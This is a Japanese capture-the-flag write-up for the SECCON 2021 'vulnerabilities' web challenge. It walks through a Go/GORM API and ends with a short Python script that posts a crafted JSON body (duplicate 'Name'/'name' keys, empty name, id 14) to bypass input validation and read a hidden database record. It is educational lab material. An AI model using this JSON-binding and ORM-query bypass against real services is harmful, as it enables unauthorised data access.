+++
title = "SECCON 2021 CTF - vulnerabilities"
date = 2022-06-22

[taxonomies]
tags = ["CTF", "Writeup", "Web", "GO"]
+++

- 問題ファイル: [SECCON2021_online_CTF/web/vulnerabilities/files/vulnerabilities at main · SECCON/SECCON2021_online_CTF](https://github.com/SECCON/SECCON2021_online_CTF/tree/main/web/vulnerabilities/files/vulnerabilities)

## TL;DR

- データベースに格納された脆弱性情報をJSONでクエリを送ることで表示するアプリケーションが動いている
- GORMの仕様を利用して空文字を指定することで`name`カラムの検索句を無視し、IDを直接指定すればフラグが手に入る
- `Name`キーが存在し、かつ空文字がどうかのチェックが存在するが、ここは`Name`キーと`name`キーをJSON中に共存させて更に後者をSQLで使わせればバイパス出来る

## Prerequisite

- GORMの仕様

## Writeup

次のようなコードで書かれたWebアプリケーションが動いている

```go
package main

import (
	"log"
	"os"

	"github.com/gin-contrib/static"
	"github.com/gin-gonic/gin"
	"github.com/gin-gonic/gin/binding"
	"gorm.io/driver/sqlite"
	"gorm.io/gorm"
)

type Vulnerability struct {
	gorm.Model
	Name string
	Logo string
	URL  string
}

func main() {
	gin.SetMode(gin.ReleaseMode)

	flag := os.Getenv("FLAG")
	if flag == "" {
		flag = "SECCON{dummy_flag}"
	}

	db, err := gorm.Open(sqlite.Open(":memory:"), &gorm.Config{})
	if err != nil {
		log.Fatal("failed to connect database")
	}

	db.AutoMigrate(&Vulnerability{})
	db.Create(&Vulnerability{Name: "Heartbleed", Logo: "/images/heartbleed.png", URL: "https://heartbleed.com/"})
	db.Create(&Vulnerability{Name: "Badlock", Logo: "/images/badlock.png", URL: "http://badlock.org/"})
	db.Create(&Vulnerability{Name: "DROWN Attack", Logo: "/images/drown.png", URL: "https://drownattack.com/"})
	db.Create(&Vulnerability{Name: "CCS Injection", Logo: "/images/ccs.png", URL: "http://ccsinjection.lepidum.co.jp/"})
	db.Create(&Vulnerability{Name: "httpoxy", Logo: "/images/httpoxy.png", URL: "https://httpoxy.org/"})
	db.Create(&Vulnerability{Name: "Meltdown", Logo: "/images/meltdown.png", URL: "https://meltdownattack.com/"})
	db.Create(&Vulnerability{Name: "Spectre", Logo: "/images/spectre.png", URL: "https://meltdownattack.com/"})
	db.Create(&Vulnerability{Name: "Foreshadow", Logo: "/images/foreshadow.png", URL: "https://foreshadowattack.eu/"})
	db.Create(&Vulnerability{Name: "MDS", Logo: "/images/mds.png", URL: "https://mdsattacks.com/"})
	db.Create(&Vulnerability{Name: "ZombieLoad Attack", Logo: "/images/zombieload.png", URL: "https://zombieloadattack.com/"})
	db.Create(&Vulnerability{Name: "RAMBleed", Logo: "/images/rambleed.png", URL: "https://rambleed.com/"})
	db.Create(&Vulnerability{Name: "CacheOut", Logo: "/images/cacheout.png", URL: "https://cacheoutattack.com/"})
	db.Create(&Vulnerability{Name: "SGAxe", Logo: "/images/sgaxe.png", URL: "https://cacheoutattack.com/"})
	db.Create(&Vulnerability{Name: flag, Logo: "/images/" + flag + ".png", URL: "seccon://" + flag})

	r := gin.Default()

	//	Return a list of vulnerability names
	//	{"Vulnerabilities": ["Heartbleed", "Badlock", ...]}
	r.GET("/api/vulnerabilities", func(c *gin.Context) {
		var vulns []Vulnerability
		if err := db.Where("name != ?", flag).Find(&vulns).Error; err != nil {
			c.JSON(400, gin.H{"Error": "DB error"})
			return
		}
		var names []string
		for _, vuln := range vulns {
			names = append(names, vuln.Name)
		}
		c.JSON(200, gin.H{"Vulnerabilities": names})
	})

	//	Return details of the vulnerability
	//	{"Logo": "???.png", "URL": "https://..."}
	r.POST("/api/vulnerability", func(c *gin.Context) {
		//	Validate the parameter
		var json map[string]interface{}
		if err := c.ShouldBindBodyWith(&json, binding.JSON); err != nil {
			c.JSON(400, gin.H{"Error": "JSON error 1"})
			return
		}
		if name, ok := json["Name"]; !ok || name == "" || name == nil {
			c.JSON(400, gin.H{"Error": "no \"Name\""})
			return
		}

		//	Get details of the vulnerability
		var query Vulnerability
		if err := c.ShouldBindBodyWith(&query, binding.JSON); err != nil {
			c.JSON(400, gin.H{"Error": "JSON error 2"})
			return
		}
		var vuln Vulnerability
		if err := db.Where(&query).First(&vuln).Error; err != nil {
			c.JSON(404, gin.H{"Error": "not found"})
			return
		}

		c.JSON(200, gin.H{
			"Logo": vuln.Logo,
			"URL":  vuln.URL,
		})
	})

	r.Use(static.Serve("/", static.LocalFile("static", false)))

	if err := r.Run(":8080"); err != nil {
		log.Fatal(err)
	}
}

```

事前にデータベースに登録された脆弱性をJSON形式でクエリを渡して検索しているようである。次のような行で1つのレコードだけフラグの情報が入っており、これを読み出す事を目標とする。

`db.Create(&Vulnerability{Name: flag, Logo: "/images/" + flag + ".png", URL: "seccon://" + flag})`

フラグの検索には次の`Vulenerability`構造体である`query`を渡してそのメンバからSQLクエリを構築する。

```go
type Vulnerability struct {
	gorm.Model
	Name string
	Logo string
	URL  string
}
```

アプリケーション側ではこれをJSON形式で渡して構造体にしている。該当箇所は`c.ShouldBindBodyWith(&query, binding.JSON)`である。よってJSONでクエリに影響があるキーは`Name, Logo, URL`となる。

フラグが入っているレコードを見ると、`Name`も`Logo`も`URL`もフラグが含まれているため、普通に指定するのは不可能である。そこでGORMの仕様を眺めていると次のようなものが見つかる。

> **NOTE** When querying with struct, GORM will only query with non-zero fields, that means if your field’s value is `0`, `''`, `false` or other [zero values](https://tour.golang.org/basics/12), it won’t be used to build query conditions, for example:

ということは`Name`に空文字を入れるとここの検索句は無視され、全てのレコードが返ってくる。このままでは`db.Where(&query).First(&vuln)`からもわかるように全件取ったうちの一番最初なのでおそらくHeartBleedのレコードが返される。しかし`Vulnerability`構造体を見ると`gorm.Model`という行があり、実はこの記述によって`Vunerability`構造体は`ID`や`CreatedAt`のようなメンバを持つ。したがって送信するクエリの`ID`にフラグが入っているレコードのIDを指定すればフラグを吸い出せる可能性がある(ちなみにこのIDは14)。

最後に1つ問題があって、`Name`キーの空文字を指定すると`if name, ok := json["Name"]; !ok || name == "" || name == nil`によって弾かれる。ここで非常に悩んだが、実は発行されるクエリのwhere節は`where name = "<...>"`になる。このことからも察せられるように送信するJSONのキーを`Name`ではなく`name`(頭が小文字)とすれば、同じように`query`の`Name`メンバに値がセットされる。

`Name`と`name`が混在している場合の挙動は明記されていないが、書いてある順に処理されるとすれば、`Name`に適当な値をセットしてから、`name`に空文字をセットすれば`query`の`Name`メンバに空文字がセットされて`name`を指定する検索は行われない。

以上より、次のようなJSONを送れば`where id = 14`となってフラグのレコードが返ってくる。

```
query = {
    "Name": "SECCON",
    "name": "",
    "id": 14
}
```

## Code

```python
import requests
import json

url = "http://localhost:8080/api/vulnerability"

query = {
    "Name": "SECCON",
    "name": "",
    "id": 14
}

r = requests.post(url, json.dumps(query))
print(r.text)
```

## Flag

ローカルでやったのでなし

## References

- [レコードの取得 | GORM - The fantastic ORM library for Golang, aims to be developer friendly.](https://gorm.io/ja_JP/docs/query.html)
